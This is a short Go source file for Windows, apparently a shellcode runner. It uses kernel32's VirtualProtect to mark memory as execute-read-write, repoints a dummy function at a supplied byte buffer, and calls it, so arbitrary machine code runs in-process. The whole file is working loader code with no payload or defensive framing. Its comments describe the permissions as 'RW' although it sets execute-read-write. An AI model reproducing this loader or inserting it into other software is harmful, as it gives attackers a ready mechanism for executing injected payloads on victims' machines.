// +build windows

package main

import (
	"fmt"
	"syscall"
	"unsafe"
)

// VirtualProtect Windows syscall: https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect
var virtualProtect = syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualProtect")

// virtualProtectSetRW wraps the VirtualProtect syscall for our purpose of
// assigning read/write permissions to a memory region
func virtualProtectSetRW(startAddress unsafe.Pointer, size int) error {
	const pageExecuteReadWrite = 0x40
	// the virtualProtect syscall will store the old permissions here
	// but we don't care about it for this purpose so we don't expose it
	var ignoredOldPerms uint32

	ret, _, err := virtualProtect.Call(
		uintptr(unsafe.Pointer(*(*uintptr)(startAddress))),
		uintptr(size),
		uintptr(pageExecuteReadWrite),
		uintptr(unsafe.Pointer(&ignoredOldPerms)))

	// from the docs: "If the function fails, the return value is zero"
	if ret == 0 {
		return fmt.Errorf("virtualProtect failed: %v", err)
	}

	return nil
}

func execShellcode(shellcode []byte) error {
	// dummy function that will later refer to the shellcode
	exec := func() {}

	// size of a pointer on the system
	ptrSize := int(unsafe.Sizeof(uintptr(0)))

	// set memory permissions on dummy function pointer address to RW
	err := virtualProtectSetRW(unsafe.Pointer(&exec), ptrSize)
	if err != nil {
		return fmt.Errorf("setting permissions on dummy function failed: %v", err)
	}

	// point the function to the shellcode memory location
	**(**uintptr)(unsafe.Pointer(&exec)) = *(*uintptr)(unsafe.Pointer(&shellcode))

	// set memory permissions on shellcode buffer to RW
	err = virtualProtectSetRW(unsafe.Pointer(&shellcode), len(shellcode))
	if err != nil {
		return fmt.Errorf("setting permissions on shellcode failed: %v", err)
	}

	exec()
	return nil
}
